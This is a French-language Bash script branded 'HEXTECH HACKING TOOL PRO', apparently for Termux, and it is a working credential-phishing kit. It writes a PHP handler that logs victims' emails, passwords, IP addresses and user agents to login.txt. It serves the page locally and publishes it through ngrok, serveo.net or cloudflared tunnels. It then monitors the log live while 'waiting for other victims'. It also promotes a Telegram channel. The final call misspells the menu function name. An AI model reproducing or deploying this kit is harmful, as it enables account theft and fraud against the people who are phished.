#!/bin/bash

# Couleurs améliorées avec effets
BLEU='\033[1;34m\033[1;5m'
JAUNE='\033[1;33m\033[1;4m'
ROUGE='\033[1;31m\033[1;3m'
VERT='\033[1;32m\033[1;2m'
CYAN='\033[1;36m\033[1;1m'
MAGENTA='\033[1;35m\033[1;6m'
NC='\033[0m' # Pas de couleur

# Animation ASCII
animation() {
    clear
    echo -e "${MAGENTA}"
    echo -e " ██╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗"
    echo -e " ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║"
    echo -e " ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║"
    echo -e " ██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║"
    echo -e " ██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║"
    echo -e " ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${VERT}          🇨🇩 HACKING TOOL PRO 🇨🇩         ${NC}"
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${JAUNE}           🔥 ${ROUGE}HEXTECH${JAUNE}  - POWERED BY ${ROUGE}HEXTECH${JAUNE} 🔥${NC}"
    echo -e "${CYAN}==================================================${NC}"
    sleep 1
}

# Fonction pour afficher les données de connexion (simplifiée pour email/password)
afficher_donnees() {
    echo -e "\n${CYAN}\n\n═════════ CONNEXION DÉTECTÉE ═══ ${NC}"
    while IFS= read -r ligne || [[ -n "$ligne" ]]; do
        ligne_clean=$(echo "$ligne" | tr -d '\r')
        case "$ligne_clean" in
            *Email:*|*email:*)
                echo -e "${VERT}✉️ E-mail: ${NC}${ligne_clean#*: }"
                ;;
            *password:*|*Password:*|*[Mm]ot\ de\ passe:*)
                echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
                ;;
            *IP:*|*ip:*)
                echo -e "${VERT}🌐 Adresse IP: ${NC}${ligne_clean#*: }"
                ;;
        esac
    done < login.txt
    echo -e "${CYAN}═🚨🚨 Ouvrez une autre page et TAPEZ nano login.txt pour voir les identifiants 🚨${NC}\n"
}

# Fonction pour surveiller et afficher les données PHP en temps réel
surveiller_donnees() {
    echo -e "${VERT}[•] Surveillance des données PHP en temps réel...${NC}"
    echo -e "${JAUNE}Appuyez sur ${ROUGE}Ctrl+C${JAUNE} pour arrêter la surveillance${NC}"

    if [ ! -f login.txt ]; then
        touch login.txt
    fi

    if [ -s login.txt ]; then
        echo -e "${JAUNE}📊 Données actuelles :${NC}"
        afficher_donnees
    else
        echo -e "${JAUNE}🔗 Voici votre lien phishing - copiez-le 👇⚠️👇${NC}"
    fi

    tail -n 0 -f login.txt | while read -r ligne; do
        if [[ "$ligne" == *"Email:"* || "$ligne" == *"password:"* ]]; then
            clear
            animation
            echo -e "${VERT}[✓] NOUVELLE CONNEXION DÉTECTÉE !${NC}"
            afficher_donnees
            echo -e "${JAUNE}🕵️ En attente d'autres victimes...${NC}"
        fi
    done
}

# Fonction pour démarrer le serveur PHP
demarrer_serveur_php() {
    echo -e "${BLEU}[•] Démarrage du serveur PHP sur le port 8080...${NC}"
    
    # Créer le fichier PHP s'il n'existe pas
    if [ ! -f login.php ]; then
        cat > login.php << 'EOL'
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    if (empty($email) || empty($password)) {
        die(json_encode(['error' => 'Email et mot de passe requis']));
    }

    $logEntry = "=== CONNEXION ===\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "Email: ".htmlspecialchars($email)."\n";
    $logEntry .= "Password: ".htmlspecialchars($password)."\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
    $logEntry .= "========================\n\n";

    $logFile = __DIR__.'/login.txt';
    
    try {
        if (!file_exists($logFile)) {
            file_put_contents($logFile, '');
            chmod($logFile, 0644);
        }

        if (!is_writable($logFile)) {
            throw new Exception("Permissions insuffisantes");
        }

        if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
            throw new Exception("Échec de l'écriture");
        }

        header("Location: mer.html");
        exit();

    } catch (Exception $e) {
        error_log("Erreur: ".$e->getMessage());
        header("HTTP/1.1 500 Erreur serveur");
        die("Erreur temporaire. Veuillez réessayer.");
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    die("Accès non autorisé");
}
EOL
        echo -e "${VERT}[✓] Fichier login.php créé${NC}"
    fi

    php -S localhost:8080 > /dev/null 2>&1 &
    sleep 2
    echo -e "${VERT}[✓] Serveur PHP démarré avec succès!${NC}"
    surveiller_donnees &
}

# [RESTE DU CODE ORIGINAL INCHANGÉ - fonctions installer_ngrok, generer_lien_ngrok, etc.]

# Fonction pour installer Ngrok
installer_ngrok() {
    echo -e "${JAUNE}[•] Téléchargement de Ngrok pour ARM64...${NC}"
    ANIM_PID=$!
    ngrok_url="https://github.com/inconshreveable/ngrok/releases/download/2.2.8/ngrok-arm64.zip"
    
    if wget -q -O ngrok.zip "$ngrok_url"; then
        kill $ANIM_PID
        printf "\r${VERT}[✓] Ngrok téléchargé avec succès.${NC}            \n"
    else
        kill $ANIM_PID
        echo -e "\r${ROUGE}[!] Échec du téléchargement de Ngrok.${NC}"
        exit 1
    fi

    echo -e "${BLEU}[•] Installation de Ngrok...${NC}"
    if unzip -q ngrok.zip; then
        mkdir -p ~/bin/
        mv ngrok ~/bin/ || { echo -e "${ROUGE}[!] Impossible de déplacer Ngrok"; exit 1; }
        echo -e "${VERT}[✓] Ngrok installé dans ~/bin/${NC}"
        rm ngrok.zip
        export PATH=$PATH:~/bin/
    else
        echo -e "${ROUGE}[!] Échec de l'extraction de Ngrok.${NC}"
        rm ngrok.zip
        exit 1
    fi
}

# Fonction pour générer un lien avec Ngrok
generer_lien_ngrok() {
    if ! command -v ngrok &> /dev/null; then
        installer_ngrok
    fi
    
    echo -e "${JAUNE}[•] Démarrage de Ngrok (http:8080)...${NC}"
    echo -e "${CYAN}==================================================${NC}"
    ~/bin/ngrok http 8080 || {
        echo -e "${ROUGE}[!] Erreur lors du lancement de Ngrok.${NC}"
        exit 1
    }
}

# Fonction pour générer un lien avec Serveo
generer_lien_serveo() {
    echo -e "${JAUNE}[•] Connexion à Serveo pour générer un lien public...${NC}"
    echo -e "${CYAN}==================================================${NC}"
    ssh -R 80:localhost:8080 serveo.net -p 22 || {
        echo -e "${ROUGE}[!] Échec de la connexion à Serveo.${NC}"
    }
}

# Fonction pour générer un lien avec Cloudflared
generer_lien_autre() {
    echo -e "${JAUNE}[•] Démarrage avec Cloudflared...${NC}"
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${ROUGE}[!] Cloudflared n'est pas installé. Installation...${NC}"
        pkg install cloudflared -y
    fi
    echo -e "${CYAN}==================================================${NC}"
    cloudflared tunnel --url http://localhost:8080 || {
        echo -e "${ROUGE}[!] Erreur avec Cloudflared.${NC}"
        exit 1
    }
}

# Vérification des dépendances
verifier_dependances() {
    echo -e "${CYAN}[•] Vérification des dépendances...${NC}"
    if ! command -v ssh &> /dev/null; then
        echo -e "${ROUGE}[!] SSH non installé. Installation...${NC}"
        pkg install openssh -y
    fi

    if ! command -v php &> /dev/null; then
        echo -e "${ROUGE}[!] PHP non installé. Installation...${NC}"
        pkg install php -y
    fi

    if ! command -v unzip &> /dev/null; then
        echo -e "${ROUGE}[!] UNZIP non installé. Installation...${NC}"
        pkg install unzip -y
    fi
    
    echo -e "${VERT}[✓] Toutes les dépendances sont satisfaites!${NC}"
}

# Menu principal
menu_principal() {
    animation
    echo -e "${VERT}1. ${BLEU}Passer à l'attaque${NC}"
    echo -e "${VERT}2. ${JAUNE}Rejoindre notre canal Telegram${NC}"
    echo -e "${VERT}3. ${ROUGE}Quitter${NC}"
    echo -e "${CYAN}==================================================${NC}"
    read -p "Choisissez une option (1-3) : " choix

    case $choix in
        1)
            echo -e "${CYAN}Choisissez une méthode de tunneling :${NC}"
            echo -e "${VERT}1. ${BLEU}Serveo (SSH)${NC}"
            echo -e "${VERT}2. ${JAUNE}Ngrok (Recommandé)${NC}"
            echo -e "${VERT}3. ${MAGENTA}Cloudflared${NC}"
            read -p "Votre choix (1-3) : " methode

            verifier_dependances
            demarrer_serveur_php

            case $methode in
                1) generer_lien_serveo ;;
                2) generer_lien_ngrok ;;
                3) generer_lien_autre ;;
                *) echo -e "${ROUGE}Option invalide. Retour au menu...${NC}"; menu_principal ;;
            esac
        ;;
        2)
            echo -e "${BLEU}Ouverture du canal Telegram HEXTECH ...${NC}"
            termux-open-url "https://t.me/hextechcar"
            menu_principal
        ;;
        3)
            echo -e "${ROUGE}Merci d'avoir utilisé notre outil!${NC}"
            exit 0
        ;;
        *)
            echo -e "${ROUGE}Option invalide. Réessayez.${NC}"
            sleep 1
            menu_principal
        ;;
    esac
}

# Point d'entrée principal
clear
menu_principa
